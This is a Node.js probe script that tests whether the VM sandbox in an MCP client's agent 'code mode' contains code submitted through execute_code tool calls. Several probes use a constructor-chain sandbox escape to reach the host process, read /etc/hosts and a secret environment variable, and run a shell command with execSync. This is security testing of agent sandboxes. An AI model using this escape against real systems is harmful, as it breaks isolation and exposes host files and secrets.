// One SPEC probe against @mcp-use/client 2.4.6 code mode (VM executor), driven through the
// internal CodeModeConnector's callTool("execute_code"), the path an agent's tool call takes.
// Usage: node probe.mjs <P1..P12|PX> [--hardened]. Prints one JSON line: {summary, raw}.
import { readFileSync, existsSync, rmSync } from "node:fs";
import { fileURLToPath, pathToFileURL } from "node:url";
import path from "node:path";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const IMPLS = path.resolve(HERE, "../../impls");
const { MCPClient } = await import(pathToFileURL(path.join(IMPLS, "mcp-use-codemode-ts/node_modules/@mcp-use/client/dist/index.js")).href);

const PID = process.argv[2];
const HARDENED = process.argv.includes("--hardened");
const COUNT = path.join(HERE, "out", "lookup-count.txt");
const MARK = path.join(HERE, "out", "P12-escape-marker.txt");
const HOSTS = readFileSync("/etc/hosts", "utf8");
const PY = path.join(IMPLS, "mcp-use-codemode/.venv/bin/python");
const config = { mcpServers: { host: { command: PY, args: [path.join(HERE, "host_server.py")], env: { LOOKUP_COUNT_FILE: COUNT } } } };
const HARDENED_OPTS = { enabled: true, executor: "vm", executorOptions: { timeoutMs: 10000, memoryLimitMb: 128 } };

const hostCalls = () => (existsSync(COUNT) ? readFileSync(COUNT, "utf8").split("\n").filter(Boolean).length : 0);

async function session() {
  const client = new MCPClient(config, { codeMode: HARDENED ? HARDENED_OPTS : true });
  await client.createAllSessions();
  const connector = client.sessions["code_mode"].connector;
  return {
    async run(code) {
      const t0 = performance.now();
      const res = await connector.callTool("execute_code", { code });
      const d = JSON.parse(res.content[0].text);
      return { ok: d.error == null, stdout: (d.logs || []).join("\n"), result: d.result, error: d.error, ms: +(performance.now() - t0).toFixed(1), textLen: res.content[0].text.length };
    },
    close: () => client.closeAllSessions(),
  };
}

const ESC = 'const P = this.constructor.constructor("return process")();\n';
const C = {
  P1: "const r = await host.lookup({id: 21}); console.log(r.value)",
  P2: 'console.log("A".repeat(200000)); "RETURNED"',
  P3: 'try { const r = await fetch("https://example.com"); console.log("STATUS", r.status) }\ncatch (e) { console.log("fetch:", String(e)); ' + ESC +
      'const https = P.getBuiltinModule("https");\nconst s = await new Promise((ok, no) => https.get("https://example.com", r => ok(r.statusCode)).on("error", no));\nconsole.log("STATUS", s) }',
  P4: 'try { console.log(require("fs").readFileSync("/etc/hosts","utf8")) }\ncatch (e) { console.log("require:", String(e)); ' + ESC + 'console.log(P.getBuiltinModule("fs").readFileSync("/etc/hosts","utf8")) }',
  P5: 'try { console.log("ENV=" + process.env.PROBE_SECRET) }\ncatch (e) { console.log("process:", String(e)); ' + ESC + 'console.log("ENV=" + P.env.PROBE_SECRET) }',
  P6: "while (true) {}",
  P6b: "await null; while (true) {}",
  P7: 'const a = []; while (true) a.push("x".repeat(1e6) + Math.random())',
  P8a: "globalThis.kept = 7",
  P8b: 'console.log(typeof kept === "undefined" ? "gone" : kept)',
  P9: "const t = Date.now(); await Promise.all([1,2,3,4,5].map(i => host.lookup({id:i}))); console.log(Date.now()-t)",
  P10: 'const x = 1;\nthrow new Error("probe-boom")',
  P11: "1+1",
  P12a: 'const p = this.constructor.constructor("return process")();\nconsole.log(typeof p, p && p.pid);\n' +
        `p.getBuiltinModule("child_process").execSync("echo PWNED-a >> ${MARK}"); console.log("ran")`,
  P12b: 'const p = (function(){return this})().process;\nconsole.log(typeof p)',
};
const EXTRAS = {
  "P2-return": 'console.log("A".repeat(200000)); return "RETURNED"',
  "P10-stack": 'try { null.x } catch (e) { console.log(e.stack) }',
  "P12-Object": 'console.log(Object.constructor("return typeof process")())',
  "client-reach": 'const p = this.constructor.constructor("return process")(); console.log(Object.keys(p.env).length, "host env vars")',
};

const out = (summary, raw) => { process.stdout.write(JSON.stringify({ summary, raw }) + "\n"); };
const both = r => `${r.stdout}\n${r.result ?? ""}`;
const s = await session();
let summary, raw = "";
const one = async (code) => { const r = await s.run(code); raw += `code:\n${code}\n${JSON.stringify({ ok: r.ok, result: r.result, error: r.error, ms: r.ms })}\nstdout (${r.stdout.length} chars): ${JSON.stringify(r.stdout.slice(0, 1500))}\n\n`; return r; };
const errWord = e => (/is not defined|not defined/.test(e || "") ? "not-defined" : "blocked");

switch (PID) {
  case "P1": { const n0 = hostCalls(); const r = await one(C.P1); const n = hostCalls() - n0; const ok = r.ok && r.stdout.includes("42");
    summary = { outcome: ok ? "works" : "error", detail: `printed ${JSON.stringify(r.stdout)}, ${n} host-side calls; error=${r.error}`, display: `works (42, ${n} host call)` }; break; }
  case "P2": { const r = await one(C.P2); const a = (r.stdout.match(/A/g) || []).length; const ret = String(r.result).includes("RETURNED");
    summary = { outcome: r.ok ? "works" : "error", detail: `return value back: ${ret} (result=${JSON.stringify(r.result)}); print chars back: ${a}; JSON text ${r.textLen} chars; error=${r.error}`, display: a >= 200000 ? `full (${a.toLocaleString("en-US")} chars)${ret ? "" : ", no return"}` : `truncated (${a})` }; break; }
  case "P3": { const r = await one(C.P3); const w = r.ok && /STATUS 200/.test(r.stdout);
    summary = { outcome: w ? "works" : r.ok ? "blocked" : errWord(r.error), detail: `${r.stdout.slice(0, 300)} ${r.error ?? ""}`.trim(), display: w ? "works (via escaped process)" : "blocked" }; break; }
  case "P4": { const r = await one(C.P4); const w = r.ok && r.stdout.includes(HOSTS.trim().slice(0, 200));
    summary = { outcome: w ? "works" : r.ok ? "blocked" : errWord(r.error), detail: w ? `read host /etc/hosts (${HOSTS.length} chars) after: ${r.stdout.split("\n")[0]}` : `${r.stdout.slice(0, 300)} ${r.error ?? ""}`, display: w ? "works (via escaped process)" : "blocked" }; break; }
  case "P5": { const r = await one(C.P5); const w = r.ok && r.stdout.includes("s3cr3t");
    summary = { outcome: w ? "works" : r.ok ? "blocked" : errWord(r.error), detail: `${r.stdout.slice(0, 300)} ${r.error ?? ""}`.trim(), display: w ? "works (s3cr3t)" : "blocked" }; break; }
  case "P6": { const r = await one(C.P6);
    summary = { outcome: r.ok ? "error" : "limited", detail: `stopped after ${(r.ms / 1000).toFixed(1)} s: ${r.error}`, display: `limited (${Math.round(r.ms / 1000)} s)` }; break; }
  case "P6b": { const r = await one(C.P6b);
    summary = { outcome: r.ok ? "error" : "limited", detail: `stopped after ${(r.ms / 1000).toFixed(1)} s: ${r.error}`, display: `limited (${Math.round(r.ms / 1000)} s)` }; break; }
  case "P7": { const r = await one(C.P7); const r2 = await one("console.log(1+1)");
    summary = { outcome: r.ok ? "error" : "limited", detail: `ended after ${(r.ms / 1000).toFixed(1)} s: ${r.error}; host process RSS ${Math.round(process.memoryUsage().rss / 2 ** 20)} MB; next execution ok=${r2.ok}`, display: "limited" }; break; }
  case "P8": { await one(C.P8a); const r = await one(C.P8b); const o = r.stdout.trim();
    summary = { outcome: o === "7" ? "persists" : o === "gone" ? "fresh" : "error", detail: `second execution printed ${JSON.stringify(o)}`, display: o === "7" ? "persists" : "fresh" }; break; }
  case "P9": { const n0 = hostCalls(); const r = await one(C.P9); const n = hostCalls() - n0; const ms = parseInt(r.stdout.trim().split("\n").pop(), 10);
    const kind = ms < 600 ? "parallel" : "serial";
    summary = { outcome: r.ok ? "works" : errWord(r.error), detail: `${ms} ms for five 200 ms lookups (${kind}); ${n} host-side calls`, display: `${kind} (${ms.toLocaleString("en-US")} ms)` }; break; }
  case "P10": { const r = await one(C.P10); const t = `${r.error}\n${r.stdout}`;
    summary = { outcome: "works", detail: `returned error=${JSON.stringify(r.error)}; message survives: ${t.includes("probe-boom")}; line/stack survives: ${/agent_code\.js|:\d+:\d+/.test(t)}`, display: t.includes("probe-boom") ? "message, no stack" : "no message" }; break; }
  case "P11": { const t0 = performance.now(); const s2 = await session(); const setup = performance.now() - t0; await s2.close();
    const xs = []; for (let i = 0; i < 20; i++) xs.push((await one(C.P11)).ms); xs.sort((a, b) => a - b);
    const med = (xs[9] + xs[10]) / 2, p90 = xs[17];
    raw += `per-execution ms: ${JSON.stringify(xs)}\nsession setup ms (client + stdio server): ${setup.toFixed(1)}\n`;
    summary = { outcome: "works", detail: `execute_code median ${med.toFixed(1)} ms, p90 ${p90.toFixed(1)} ms over 20 executions (new vm context each); session setup ${setup.toFixed(1)} ms`, display: `median ${med.toFixed(1)} ms` }; break; }
  case "P12": { rmSync(MARK, { force: true }); const a = await one(C.P12a); const b = await one(C.P12b);
    const esc = existsSync(MARK);
    summary = { outcome: esc ? "escaped" : "blocked", detail: `P12a this.constructor.constructor("return process")(): ${a.stdout.replace(/\n/g, " | ")} ${a.error ?? ""}; host marker written: ${esc} | P12b (function(){return this})().process: ${b.stdout.trim()} ${b.error ?? ""}`, display: esc ? "escaped (constructor chain)" : "blocked" }; break; }
  case "PX": { for (const [k, code] of Object.entries(EXTRAS)) { raw += `--- ${k}\n`; const r = await one(code); }
    summary = { outcome: "works", detail: "see raw", display: "extras" }; break; }
}
await s.close();
out({ probe: PID, config: HARDENED ? "hardened" : "default", ...summary }, raw);
process.exit(0);
